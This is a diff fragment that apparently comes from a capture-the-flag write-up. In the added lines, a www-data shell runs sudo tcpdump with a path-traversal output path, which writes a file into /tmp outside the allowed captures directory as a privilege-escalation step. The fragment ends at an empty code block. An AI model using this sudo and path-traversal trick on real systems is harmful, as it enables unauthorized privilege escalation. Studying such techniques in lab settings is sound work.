@@ -268,7 +268,26 @@ www-data@dump:/var/cache/captures$
 
 As seen here it has created the filter file
 
+```python
+www-data@dump:/var/cache/captures$ mkdir x
+```
 
+Then ill create a dummy directory that i control
+
+```python
+www-data@dump:/var/cache/captures$ sudo tcpdump -c10 -w/var/cache/captures/x/../../../../tmp/11111111-1111-1111-1111-111111111111 -F/var/cache/captures/filter.11111111-2222-3333-4444-555555555555
+tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+10 packets captured
+10 packets received by filter
+0 packets dropped by kernel
+www-data@dump:/var/cache/captures$
+```
+
+Then i can test this
+
+```python
+
+```
 
 
 
